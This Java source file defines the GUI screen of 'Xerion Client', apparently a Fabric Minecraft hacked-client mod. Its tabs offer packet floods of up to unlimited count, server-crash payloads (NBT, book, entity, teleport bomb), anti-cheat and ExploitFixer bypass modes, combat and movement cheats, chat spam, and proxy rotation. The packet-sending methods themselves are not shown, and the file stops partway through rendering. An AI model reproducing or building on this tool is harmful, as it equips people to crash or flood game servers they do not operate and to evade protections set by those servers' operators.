package com.professor.client.gui;

import com.professor.client.ProfessorClientMod;
import com.professor.client.proxy.ProxyManager;
import com.professor.client.task.BackgroundTaskManager;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.math.MathHelper;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ══ ICE PALETTE ═══════════════════════════════════════════════════════
    private static final int BG         = 0xFF010A14;
    private static final int PANEL_BG   = 0xFF041828;
    private static final int BORDER     = 0xFFAAEEFF;
    private static final int BORDER2    = 0xFF55CCFF;
    private static final int TITLE1     = 0xFFEEF8FF;
    private static final int TITLE2     = 0xFFFFD700;
    private static final int TXT_ICE    = 0xFF88DDFF;
    private static final int TXT_DIM    = 0xFF336688;
    private static final int TXT_BRIGHT = 0xFFCCF0FF;
    private static final int SNOW_W     = 0xFFFFFFFF;
    private static final int SNOW_B     = 0xFFCCEEFF;
    private static final int CRYSTAL    = 0xFF00CCEE;
    private static final int GOLD       = 0xFFFFD700;
    private static final int RED        = 0xFFFF2244;
    private static final int GREEN      = 0xFF00FF99;
    private static final int ORANGE     = 0xFFFF8800;
    private static final int PURPLE     = 0xFFAA55FF;

    // ── Layout ─────────────────────────────────────────────────────────────
    private static final int PW = 760, PH = 520, TH = 36, TABH = 26;

    // ── Tabs ──────────────────────────────────────────────────────────────
    private static final String[] TABS = {"⚡FLOOD","❄BYPASS","💥EXPLOIT","☠CRASH","⚔COMBAT","🏃MOVE","💬CHAT","🌐PROXY"};
    private static final int      NT   = 8;
    private static final int[] TC = {0x55DDFF,0x00FFCC,0x88AAFF,0xFF3355,0xFF6644,0xFFBB44,0x44BBFF,0x55FF99};
    private int   tab      = 0;
    private float tabSlide = 1f;

    // ── Bypass modes ───────────────────────────────────────────────────────
    private static final String[] BP = {
        "OFF","BURST","WAVE","NCP","MATRIX","VULCAN","GRIM","GHOST","INTAVE","CRASHPASS","EXFIX"
    };
    private int bypass = 0;

    // ── Settings ───────────────────────────────────────────────────────────
    private int     delay = 0, burst = 1, speed = 1;
    private boolean unlimited = false, timedMode = false, bgMode = false;
    private int     exploitType = 0, crashType = 0;
    private TextFieldWidget numField, chatField, proxyField;

    // ── Status / VL ────────────────────────────────────────────────────────
    private String statusText  = "Xerion Client v4  ❄  Ready";
    private int    statusColor = TXT_ICE;
    private int    statusTimer = 0;
    private float  vlEstimate  = 0f;
    private long   lastVlTick  = 0;

    // ── Animation ──────────────────────────────────────────────────────────
    private long  tick   = 0;
    private float glow   = 0f; private boolean glowUp = true;
    private float hue    = 0f;
    private float scanA  = 0f;
    private float hexOff = 0f;
    private float snowDrift = 0f;
    private float hypeSmooth = 0f;

    // ── Snow ───────────────────────────────────────────────────────────────
    private static final int SCNT = 220;
    private final float[] sx=new float[SCNT],sy=new float[SCNT];
    private final float[] ssp=new float[SCNT],ssz=new float[SCNT];
    private final float[] sal=new float[SCNT],sph=new float[SCNT];

    // ── Sparkles ───────────────────────────────────────────────────────────
    private static final int GPCNT = 60;
    private final float[] gpx=new float[GPCNT],gpy=new float[GPCNT];
    private final float[] gpp=new float[GPCNT],gps=new float[GPCNT];

    // ── Particles ──────────────────────────────────────────────────────────
    private static final int PCNT = 200;
    private final float[] ppx=new float[PCNT],ppy=new float[PCNT];
    private final float[] pvx=new float[PCNT],pvy=new float[PCNT];
    private final float[] psz=new float[PCNT],pal=new float[PCNT];
    private final float[] pph=new float[PCNT]; private final int[] pct=new int[PCNT];

    // ── Mouse trail ────────────────────────────────────────────────────────
    private record TrailPt(int x, int y, int color, float life){}
    private final List<TrailPt> trail = new ArrayList<>();
    private int lastMx=-1, lastMy=-1;

    // ── Data stream ────────────────────────────────────────────────────────
    private static final String DS = "XERION01FROST10BYPASS00ICE11EXFIX";
    private final float[] dsX=new float[70],dsY=new float[70],dsSp=new float[70];
    private final int[]   dsCh=new int[70];

    // ── Hype burst ─────────────────────────────────────────────────────────
    private final List<float[]> burstPts = new ArrayList<>();

    private final Random rng = new Random();

    // ══════════════════════════════════════════════════════════════════════
    public ProfessorScreen() {
        super(Text.literal("Xerion Client"));
        initAll();
    }

    @Override protected void init()    { initAll(); rebuild(); ProfessorMusicManager.onOpen(client); }
    @Override public void    removed() { ProfessorMusicManager.onClose(client); super.removed(); }
    @Override public boolean shouldPause() { return false; }

    private void initAll() {
        int W=width<=0?800:width, H=height<=0?600:height;
        for(int i=0;i<SCNT;i++){sx[i]=rng.nextFloat()*W;sy[i]=rng.nextFloat()*H;ssp[i]=rng.nextFloat()*.85f+.2f;ssz[i]=rng.nextFloat()*4f+1f;sal[i]=rng.nextFloat()*.75f+.25f;sph[i]=rng.nextFloat()*6.28f;}
        for(int i=0;i<GPCNT;i++){gpx[i]=rng.nextFloat()*W;gpy[i]=rng.nextFloat()*H;gpp[i]=rng.nextFloat()*6.28f;gps[i]=rng.nextFloat()*3f+1.5f;}
        for(int i=0;i<PCNT;i++){ppx[i]=rng.nextFloat()*W;ppy[i]=rng.nextFloat()*H;pvx[i]=(rng.nextFloat()-.5f)*.5f;pvy[i]=-(rng.nextFloat()*.7f+.1f);psz[i]=rng.nextFloat()*3+.5f;pal[i]=rng.nextFloat()*.85f+.15f;pph[i]=rng.nextFloat()*6.28f;pct[i]=rng.nextInt(5);}
        for(int i=0;i<70;i++){dsX[i]=i*(W/70f);dsY[i]=rng.nextFloat()*-H;dsSp[i]=rng.nextFloat()*1.3f+.4f;dsCh[i]=rng.nextInt(DS.length());}
    }

    // ── Rebuild widgets ────────────────────────────────────────────────────
    private void rebuild() {
        clearChildren(); numField=null; chatField=null; proxyField=null;
        int cx=width/2, bpx=cx-PW/2, bpy=height/2-PH/2;
        int tabW=(PW-14)/NT;
        for(int i=0;i<NT;i++){final int idx=i; addDrawableChild(ButtonWidget.builder(Text.literal(TABS[i]),b->{cs();switchTab(idx);}).dimensions(bpx+7+i*(tabW+1),bpy+TH+5,tabW,TABH).build());}
        switch(tab){
            case 0->buildFlood(cx,bpy);  case 1->buildBypass(cx,bpy,bpx);
            case 2->buildExploit(cx,bpy); case 3->buildCrash(cx,bpy);
            case 4->buildCombat(cx,bpy);  case 5->buildMove(cx,bpy);
            case 6->buildChat(cx,bpy);    case 7->buildProxy(cx,bpy,bpx);
        }
        addDrawableChild(ButtonWidget.builder(Text.literal("✕  CLOSE"),b->{cs();ProfessorClientMod.clearQueue();close();}).dimensions(cx-48,bpy+PH-30,96,22).build());
    }

    private void switchTab(int t){if(t==tab)return;tab=t;tabSlide=0f;rebuild();}
    private void cs(){if(client!=null)ProfessorClientMod.playClickSound(client);}
    private void flash(String t,int c){statusText=t;statusColor=c;statusTimer=200;}
    private void addVl(float v){vlEstimate=Math.min(100f,vlEstimate+v);lastVlTick=tick;}

    // ══ TAB BUILDERS ══════════════════════════════════════════════════════

    private void buildFlood(int cx,int bpy){
        int y=bpy+75,bw=320;
        addDrawableChild(ButtonWidget.builder(Text.literal(unlimited?"MODE: UNLIMITED !!!":"MODE: COUNT"),b->{cs();unlimited=!unlimited;b.setMessage(Text.literal(unlimited?"MODE: UNLIMITED !!!":"MODE: COUNT"));}).dimensions(cx-bw/2,y,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal(timedMode?"SEND: TIMED (EF-safe)":"SEND: INSTANT"),b->{cs();timedMode=!timedMode;b.setMessage(Text.literal(timedMode?"SEND: TIMED (EF-safe)":"SEND: INSTANT"));}).dimensions(cx-bw/2,y+24,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal(bgMode?"BG-MODE: ON (GUI closeable)":"BG-MODE: OFF"),b->{cs();bgMode=!bgMode;b.setMessage(Text.literal(bgMode?"BG-MODE: ON (GUI closeable)":"BG-MODE: OFF"));}).dimensions(cx-bw/2,y+46,bw,18).build());
        numField=new TextFieldWidget(textRenderer,cx-75,y+68,150,18,Text.empty());numField.setMaxLength(9);numField.setText("10000");addSelectableChild(numField);
        int[][] pr={{1000,-190},{5000,-85},{20000,40},{100000,160}};
        for(int[] p:pr){int n=p[0];addDrawableChild(ButtonWidget.builder(Text.literal(n>=1000?(n/1000)+"K":""+n),b->{cs();numField.setText(""+n);}).dimensions(cx+p[1]-28,y+90,56,16).build());}
        addDrawableChild(ButtonWidget.builder(Text.literal("Bypass: "+BP[bypass]),b->{cs();bypass=(bypass+1)%BP.length;b.setMessage(Text.literal("Bypass: "+BP[bypass]));}).dimensions(cx-bw/2,y+110,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Delay: "+delay+"ms"),b->{cs();delay=(delay+5)%55;b.setMessage(Text.literal("Delay: "+delay+"ms"));}).dimensions(cx-bw/2,y+132,bw,16).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("⛔ STOP QUEUE"),b->{cs();ProfessorClientMod.clearQueue();BackgroundTaskManager.cancelAll();flash("⛔ Queue cleared + BG tasks cancelled",RED);}).dimensions(cx-bw/2,y+152,bw,16).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("❄ >>>  SEND PACKETS  <<< ❄"),b->{cs();doFlood();}).dimensions(cx-150,y+174,300,28).build());
    }

    private void buildBypass(int cx,int bpy,int bpx){
        int bw=PW-38,x=bpx+19,y=bpy+70;
        String[] bi={
            "Raw — no bypass applied",
            "Burst Y 0.0625 every 3 pkts",
            "Sine Y ~0.08 amplitude",
            "NCP multi-pattern spoofing",
            "Matrix 4-step Y pattern",
            "Vulcan micro-variance + sparse jump",
            "Grim vanilla-like sparse",
            "Ghost ultra-stealth minimal",
            "Intave dual-sine harmonic",
            "CrashPass extreme noise",
            "EXFIX ★ TeleportConfirm 0.01 VL/pkt — sustained @2000/sec"
        };
        for(int i=0;i<BP.length;i++){
            final int idx=i; boolean sel=(bypass==idx);
            addDrawableChild(ButtonWidget.builder(Text.literal((sel?"▶ ❄ ":"")+BP[i]+"   "+bi[i]),b->{cs();bypass=idx;rebuild();}).dimensions(x,y+i*19,bw,17).build());
        }
        int ay=y+BP.length*19+14; int hw=(bw-4)/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("📦 Packet Filter Bypass"),  b->{cs();bypassPacketFilter();}).dimensions(x,     ay,   hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("🛡 Anti-Exploit Bypass"),   b->{cs();bypassAntiExploit();}).dimensions(x+hw+4, ay,   hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("📋 NBT Filter Bypass"),     b->{cs();bypassNBT();}).dimensions(x,     ay+21,hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("📖 Book Protection Bypass"),b->{cs();bypassBook();}).dimensions(x+hw+4,ay+21,hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("👾 Entity Limit Bypass"),   b->{cs();bypassEntity();}).dimensions(x,     ay+42,hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("🗺 Chunk Protection Bypass"),b->{cs();bypassChunk();}).dimensions(x+hw+4,ay+42,hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("⏱ Rate-Limit Bypass"),     b->{cs();bypassRateLimit();}).dimensions(x,     ay+63,hw,17).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("❄ ExploitFixer FULL Flood"),b->{cs();bypassExploitFixer();}).dimensions(x+hw+4,ay+63,hw,17).build());
    }

    private void buildExploit(int cx,int bpy){
        String[] en={"Swing Flood","Slot Spam","Teleport Ack","Move Flood","Interact Flood"};
        for(int i=0;i<en.length;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal((exploitType==idx?"▶ ":"")+en[idx]),b->{cs();exploitType=idx;rebuild();}).dimensions(cx-260,bpy+72+i*22,520,18).build());}
        numField=new TextFieldWidget(textRenderer,cx-75,bpy+200,150,18,Text.empty());numField.setMaxLength(7);numField.setText("1000");addSelectableChild(numField);
        addDrawableChild(ButtonWidget.builder(Text.literal("[ EXECUTE ]"),b->{cs();doExploit();}).dimensions(cx-120,bpy+224,240,26).build());
    }

    private void buildCrash(int cx,int bpy){
        String[] cn={"Packet Crash — 100k rapid packets","NBT Crash — deep NBT payload","Book Crash — 50-page book packet","Entity Crash — 5k interact flood","Tick Lag — 10k complex sequence","Move Spam — 50k extreme coords","Chat Flood — 200 rapid messages","Teleport Bomb — 10k random acks"};
        for(int i=0;i<cn.length;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal((crashType==idx?"▶ ":"")+cn[idx]),b->{cs();crashType=idx;rebuild();}).dimensions(cx-260,bpy+72+i*22,520,18).build());}
        addDrawableChild(ButtonWidget.builder(Text.literal("[ EXECUTE CRASH ]"),b->{cs();doCrash();}).dimensions(cx-120,bpy+264,240,28).build());
    }

    private void buildCombat(int cx,int bpy){
        int bw=420,bx=cx-bw/2,y=bpy+74;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Hit Spam — 200×burst swings"),    b->{cs();combatHit();}).dimensions(bx,y,    bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Crit Exploit — 0.42 Y-jump + hit"),b->{cs();combatCrit();}).dimensions(bx,y+24,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Anti-KB — 150 ground packets"),    b->{cs();combatAKB();}).dimensions(bx,y+48,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Fast Use — 80 off-hand use"),      b->{cs();combatFU();}).dimensions(bx,y+72,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Reach — arc position flood"),      b->{cs();combatReach();}).dimensions(bx,y+96,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Velocity Abuse — mixed Y arc"),    b->{cs();combatVelo();}).dimensions(bx,y+120,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Burst: "+burst+"x"),b->{cs();burst=burst%8+1;b.setMessage(Text.literal("Burst: "+burst+"x"));}).dimensions(cx-60,y+148,120,18).build());
    }

    private void buildMove(int cx,int bpy){
        int bw=420,bx=cx-bw/2,y=bpy+74;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Speed Boost"),b->{cs();moveSpd();}).dimensions(bx,y,   bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Blink"),       b->{cs();moveBlink();}).dimensions(bx,y+24,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Fly Exploit"), b->{cs();moveFly();}).dimensions(bx,y+48,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  NoFall"),       b->{cs();moveNF();}).dimensions(bx,y+72,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Step"),          b->{cs();moveStep();}).dimensions(bx,y+96,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Strafe"),        b->{cs();moveStrafe();}).dimensions(bx,y+120,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[7]  Copy Coords"),   b->{cs();copyCoords();}).dimensions(bx,y+144,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Speed: "+speed+"x"),b->{cs();speed=speed%12+1;b.setMessage(Text.literal("Speed: "+speed+"x"));}).dimensions(cx-60,y+170,120,18).build());
    }

    private void buildChat(int cx,int bpy){
        chatField=new TextFieldWidget(textRenderer,cx-180,bpy+80,360,20,Text.empty());chatField.setMaxLength(256);chatField.setText("/gamemode creative");addSelectableChild(chatField);
        numField=new TextFieldWidget(textRenderer,cx-75,bpy+106,150,18,Text.empty());numField.setMaxLength(6);numField.setText("50");addSelectableChild(numField);
        addDrawableChild(ButtonWidget.builder(Text.literal("SPAM CHAT"),      b->{cs();doChat();}).dimensions(cx-110,bpy+130,220,22).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("SEND AS COMMAND"),b->{cs();doCmd();}).dimensions(cx-110,bpy+156,220,20).build());
    }

    private void buildProxy(int cx, int bpy, int bpx) {
        int bw=PW-38, x=bpx+19, y=bpy+68;

        // Proxy enabled toggle
        addDrawableChild(ButtonWidget.builder(
            Text.literal(ProxyManager.isEnabled() ? "PROXY: ENABLED ✓" : "PROXY: DISABLED"),
            b -> { cs(); ProxyManager.setEnabled(!ProxyManager.isEnabled()); rebuild(); }
        ).dimensions(x, y, bw, 20).build());

        // Stats line
        // Proxy input field
        proxyField = new TextFieldWidget(textRenderer, x, y+26, bw-82, 18, Text.empty());
        proxyField.setMaxLength(512);
        proxyField.setSuggestion("ip:port  or  socks5://ip:port  or  ip:port:user:pass");
        addSelectableChild(proxyField);

        addDrawableChild(ButtonWidget.builder(Text.literal("ADD"),b->{
            cs();
            if(proxyField!=null&&!proxyField.getText().isBlank()){
                ProxyManager.addBulk(proxyField.getText());
                proxyField.setText("");
                flash("✓ Proxy added — total: "+ProxyManager.count(), GREEN);
                rebuild();
            }
        }).dimensions(x+bw-78,y+26,78,18).build());

        // Proxy list
        List<ProxyManager.ProxyEntry> all = ProxyManager.getAll();
        int listY = y + 50;
        for(int i=0;i<Math.min(all.size(),6);i++){
            final int idx=i;
            ProxyManager.ProxyEntry e=all.get(i);
            String label = (e.alive?"❄ ":"✗ ")+e.toString();
            addDrawableChild(ButtonWidget.builder(Text.literal(label),b->{ cs();ProxyManager.remove(idx);flash("Removed proxy #"+idx,ORANGE);rebuild();}).dimensions(x,listY+i*19,bw,17).build());
        }
        if(all.size()>6){
            int moreY=listY+6*19;
            // Just a display text — no button needed
        }

        int btnY = listY + Math.max(6,all.size())*19 + 6;
        if(btnY > bpy+PH-70) btnY = bpy+PH-70;

        addDrawableChild(ButtonWidget.builder(Text.literal("🗑 CLEAR ALL PROXIES"),b->{cs();ProxyManager.clear();flash("⛔ All proxies cleared",RED);rebuild();}).dimensions(x,btnY,bw/2-4,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("📋 BULK PASTE"),b->{
            cs();
            if(proxyField!=null){
                String t=proxyField.getText();
                if(!t.isBlank()){ProxyManager.addBulk(t);proxyField.setText("");flash("✓ Bulk added — total: "+ProxyManager.count(),GREEN);rebuild();}
            }
        }).dimensions(x+bw/2+4,btnY,bw/2-4,18).build());
    }

    // ══ RENDER ════════════════════════════════════════════════════════════
    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tick++;
        float hype = ProfessorMusicManager.getHypeLevel();
        hypeSmooth = hypeSmooth * 0.88f + hype * 0.12f;
        hue   = (hue + 0.004f) % 1f;
        scanA = (scanA + 1.2f) % (height + 60);
        hexOff= (hexOff + 0.22f) % 60f;
        snowDrift = tick * 0.009f;

        glow += glowUp ? 0.028f : -0.028f;
        if(glow>=1f){glow=1f;glowUp=false;} else if(glow<=0f){glow=0f;glowUp=true;}

        if(statusTimer>0){statusTimer--;if(statusTimer==0){statusText="Xerion Client v4  ❄  Ready";statusColor=TXT_ICE;}}
        if(!BackgroundTaskManager.isIdle()){statusText=BackgroundTaskManager.getStatus();statusColor=BackgroundTaskManager.getStatusColor();statusTimer=2;}

        // Decay VL
        if(tick-lastVlTick>20) vlEstimate=Math.max(0f,vlEstimate-0.4f);

        // Update snow
        for(int i=0;i<SCNT;i++){
            sy[i]+=ssp[i]; sx[i]+=MathHelper.sin(snowDrift+sph[i])*0.38f; sph[i]+=0.007f;
            if(sy[i]>height+6){sy[i]=-6;sx[i]=rng.nextFloat()*width;}
            if(sx[i]<-6)sx[i]=width+5; if(sx[i]>width+5)sx[i]=-6;
        }
        for(int i=0;i<GPCNT;i++) gpp[i]+=0.052f;
        for(int i=0;i<PCNT;i++){
            ppx[i]+=pvx[i]; ppy[i]+=pvy[i];
            pph[i]+=0.06f; pvx[i]+=(rng.nextFloat()-.5f)*.02f;
            if(ppy[i]<-8||ppx[i]<-8||ppx[i]>width+8){ppx[i]=rng.nextFloat()*width;ppy[i]=height;pvx[i]=(rng.nextFloat()-.5f)*.4f;pvy[i]=-(rng.nextFloat()*.6f+.1f);}
        }
        // Data streams
        for(int i=0;i<70;i++){dsY[i]+=dsSp[i];if(dsY[i]>height+20){dsY[i]=-20;dsCh[i]=rng.nextInt(DS.length());}if(rng.nextInt(25)==0)dsCh[i]=rng.nextInt(DS.length());}
        // Mouse trail
        if(mx!=lastMx||my!=lastMy){trail.add(new TrailPt(mx,my,withA(BORDER2,(int)(180*glow)),1f));lastMx=mx;lastMy=my;}
        trail.replaceAll(t->new TrailPt(t.x(),t.y(),t.color(),(t.life()-0.08f)));
        trail.removeIf(t->t.life()<=0);
        // Burst
        burstPts.replaceAll(p->{p[2]+=p[3];p[4]-=0.035f;return p;});
        burstPts.removeIf(p->p[4]<=0);

        int cx2=width/2, bpx=cx2-PW/2, bpy=height/2-PH/2;

        // ── Background ─────────────────────────────────────────────────────
        ctx.fill(0,0,width,height,BG);
        for(int x=0;x<width;x+=44){ctx.fill(x,0,x+1,height,withA(0x113355,8));}
        for(int y=0;y<height;y+=44){ctx.fill(0,y,width,y+1,withA(0x113355,8));}

        // Scan line
        int scA=(int)(12+8*hypeSmooth);
        ctx.fill(0,(int)(scanA-2),width,(int)scanA,withA(BORDER2,scA));

        // Data streams
        for(int i=0;i<70;i++){if(dsY[i]<0)continue;int a=(int)(45+25*hypeSmooth);if(a>0)ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i],withA(0x44BBDD,a),false);}

        // Snow particles
        for(int i=0;i<SCNT;i++){
            float tw=(MathHelper.sin(sph[i])+1f)/2f;
            int a=(int)(sal[i]*(0.5f+0.5f*tw)*255); if(a<12)continue;
            int sz=(int)ssz[i]; int col=ssz[i]>3.5f?SNOW_W:ssz[i]>2.5f?SNOW_B:0xFFAABBCC;
            ctx.fill((int)sx[i],(int)sy[i],(int)sx[i]+sz,(int)sy[i]+sz,withA(col,a));
            if(sz>=3&&a>130)ctx.fill((int)sx[i]+1,(int)sy[i]+1,(int)sx[i]+sz-1,(int)sy[i]+sz-1,withA(SNOW_W,Math.min(255,a+50)));
        }
        // Sparkles
        for(int i=0;i<GPCNT;i++){float tw=(MathHelper.sin(gpp[i])+1f)/2f;if(tw<0.65f)continue;int a=(int)((tw-.65f)*2.86f*200);if(a<20)continue;int sz=(int)gps[i];ctx.fill((int)gpx[i]-sz,(int)gpy[i],(int)gpx[i]+sz,(int)gpy[i]+1,withA(SNOW_W,a));ctx.fill((int)gpx[i],(int)gpy[i]-sz,(int)gpx[i]+1,(int)gpy[i]+sz,withA(SNOW_W,a));}
        // Particles
        for(int i=0;i<PCNT;i++){if(pal[i]<.12f)continue;int[] cols2={0xFF55DDFF,0xFF00FFCC,0xFF88AAFF,0xFFFFD700,0xFF00FF99};int a=(int)(pal[i]*(0.5f+0.5f*MathHelper.sin(pph[i]))*160*(1+hypeSmooth));if(a<15)continue;int sz=(int)(psz[i]*(1+hypeSmooth*.5f));ctx.fill((int)ppx[i],(int)ppy[i],(int)ppx[i]+sz,(int)ppy[i]+sz,withA(cols2[pct[i]],a));}
        // Trail
        for(TrailPt tp:trail){int a=(int)(tp.life()*120);if(a>0)ctx.fill(tp.x()-1,tp.y()-1,tp.x()+1,tp.y()+1,withA(BORDER2,a));}
        // Burst
        for(float[] b2:burstPts){int a=(int)(b2[4]*200);if(a>0)ctx.fill((int)b2[0],(int)b2[1],(int)b2[0]+2,(int)b2[1]+2,withA(0xFFFFD700,a));}

        // ── Panel shadow + body ─────────────────────────────────────────────
        ctx.fill(bpx+16,bpy+16,bpx+PW+16,bpy+PH+16,withA(0xFF000000,145));
        ctx.fill(bpx+8, bpy+8, bpx+PW+8, bpy+PH+8, withA(0xFF000000,65));
        ctx.fill(bpx,bpy,bpx+PW,bpy+PH,PANEL_BG);
        for(int y=0;y<60;y++){int ga=(int)((1f-y/60f)*22*(1+hypeSmooth));if(ga>0)ctx.fill(bpx,bpy+y,bpx+PW,bpy+y+1,(ga<<24)|0xAADDFF);}

        // Hype pulse overlay
        if(hypeSmooth>0.05f){int ha=(int)(hypeSmooth*18);if(ha>0)ctx.fill(bpx,bpy,bpx+PW,bpy+PH,withA(0xFF004488,ha));}

        // ── Border ─────────────────────────────────────────────────────────
        int bA=(int)((0.9f+0.1f*glow)*255); int ogA=(int)(0.28f*glow*255*(1+hypeSmooth*.5f));
        if(ogA>0){ctx.fill(bpx-5,bpy-5,bpx+PW+5,bpy+1,withA(BORDER,ogA));ctx.fill(bpx-5,bpy+PH-1,bpx+PW+5,bpy+PH+5,withA(BORDER,ogA));ctx.fill(bpx-5,bpy-5,bpx+1,bpy+PH+5,withA(BORDER,ogA));ctx.fill(bpx+PW-1,bpy-5,bpx+PW+5,bpy+PH+5,withA(BORDER,ogA));}
        ctx.fill(bpx,     bpy,     bpx+PW,  bpy+5,    withA(BORDER,bA));
        ctx.fill(bpx,     bpy+PH-5,bpx+PW,  bpy+PH,   withA(BORDER,bA));
        ctx.fill(bpx,     bpy,     bpx+5,   bpy+PH,   withA(BORDER,bA));
        ctx.fill(bpx+PW-5,bpy,     bpx+PW,  bpy+PH,   withA(BORDER,bA));
        ctx.fill(bpx+5,bpy+5,bpx+PW-5,bpy+6,withA(TITLE1,(int)(0.38f*255)));
        ctx.fill(bpx+5,bpy+PH-6,bpx+PW-5,bpy+PH-5,withA(TITLE1,(int)(0.38f*255)));

        // Gold corners + crystal shards
        int gcA=(int)(0.95f*255); drawCorner(ctx,bpx,bpy,bpx+PW,bpy+PH,36,withA(GOLD,gcA));
        int csA=(int)(155+60*glow);
        drawShard(ctx,bpx+6,   bpy+6,    withA(CRYSTAL,csA));
        drawShard(ctx,bpx+PW-15,bpy+6,   withA(CRYSTAL,csA));
        drawShard(ctx,bpx+6,   bpy+PH-20,withA(CRYSTAL,csA));
        drawShard(ctx,bpx+PW-15,bpy+PH-20,withA(CRYSTAL,csA));

        // ── Title row ──────────────────────────────────────────────────────
        String t1="XERION",t2=" CLIENT";
        int tw1=textRenderer.getWidth(t1),tw2=textRenderer.getWidth(t2);
        int tx=cx2-(tw1+tw2)/2, ty=bpy+10;
        // Rainbow hue shimmer on "XERION"
        float hr=hue; int shimmerCol=hsvToRgb(hr,0.5f,1f);
        int glA=(int)(60+45*glow); for(int d=-5;d<=5;d++){int g2=Math.max(0,glA-Math.abs(d)*9);if(g2>0){ctx.drawText(textRenderer,t1+t2,tx+d,ty,(g2<<24)|0x00CCFF,false);ctx.drawText(textRenderer,t1+t2,tx,ty+d,(g2<<24)|0x00CCFF,false);}}
        int tA=(int)(220+35*glow);
        ctx.drawText(textRenderer,t1,tx,ty,withA(shimmerCol,tA),false);
        ctx.drawText(textRenderer,t2,tx+tw1,ty,withA(TITLE2,tA),false);

        // Version badge
        String ver="v4.0";
        ctx.drawText(textRenderer,ver,bpx+PW-textRenderer.getWidth(ver)-8,bpy+9,withA(CRYSTAL,(int)(160+60*glow)),false);

        // Subtitle / player info
        String sub; int subCol=CRYSTAL;
        if(client!=null&&client.player!=null){
            var p=client.player;
            sub=String.format("X:%.1f  Y:%.1f  Z:%.1f  ❄  HP:%.1f  ❄  Proxies:%d",p.getX(),p.getY(),p.getZ(),p.getHealth(),(float)ProxyManager.count());
        } else {
            sub="❄  Frost Engine  ·  "+ProfessorClientMod.VERSION+"  ·  1.21.1  ❄";
        }
        ctx.drawText(textRenderer,sub,cx2-textRenderer.getWidth(sub)/2,ty+12,withA(subCol,(int)(145+50*glow)),false);

        // Divider
        ctx.fill(bpx+28,bpy+TH-2,bpx+PW-28,bpy+TH-1,withA(BORDER2,100));

        // ── Tabs ───────────────────────────────────────────────────────────
        int tabW=(PW-14)/NT;
        for(int i=0;i<NT;i++){
            boolean active=(i==tab);
            int tabX=bpx+7+i*(tabW+1), tabY2=bpy+TH+5;
            if(active){
                // Glow underline under active tab
                int tabGlA=(int)(100+80*glow);
                ctx.fill(tabX,tabY2+TABH,tabX+tabW,tabY2+TABH+3,withA(TC[i]|(TC[i]<<24),tabGlA));
                ctx.fill(tabX,tabY2+TABH+3,tabX+tabW,tabY2+TABH+4,withA(TC[i]|(TC[i]<<24),tabGlA/2));
            }
        }

        // ── VL meter ───────────────────────────────────────────────────────
        int vmX=bpx+8,vmY=bpy+PH-50,vmW=120,vmH=8;
        ctx.fill(vmX-1,vmY-1,vmX+vmW+1,vmY+vmH+1,withA(BORDER,(int)(80+40*glow)));
        ctx.fill(vmX,vmY,vmX+vmW,vmY+vmH,withA(0xFF010E1E,200));
        int vlFill=(int)(vmW*vlEstimate/100f);
        if(vlFill>0){
            int vlCol=vlEstimate<40?GREEN:vlEstimate<70?ORANGE:RED;
            ctx.fill(vmX,vmY,vmX+vlFill,vmY+vmH,withA(vlCol,(int)(180+40*glow)));
        }
        ctx.drawText(textRenderer,"VL:"+String.format("%.0f",vlEstimate),vmX+vmW+5,vmY,withA(TXT_ICE,160),false);

        // Background task indicator
        if(!BackgroundTaskManager.isIdle()){
            int bgX=bpx+PW-160, bgY=bpy+PH-50;
            int pulse=(int)(140+80*glow);
            ctx.fill(bgX-2,bgY-2,bgX+155,bgY+12,withA(0xFF001830,200));
            ctx.fill(bgX-2,bgY-2,bgX+155,bgY-1,withA(GREEN,pulse/2));
            ctx.drawText(textRenderer,"⚡ BG RUNNING — CLOSE SAFE",bgX,bgY,withA(GREEN,pulse),false);
        }

        // ── Status bar ─────────────────────────────────────────────────────
        int statusY=bpy+PH-34;
        ctx.fill(bpx+6,statusY-2,bpx+PW-6,statusY-1,withA(BORDER2,50));
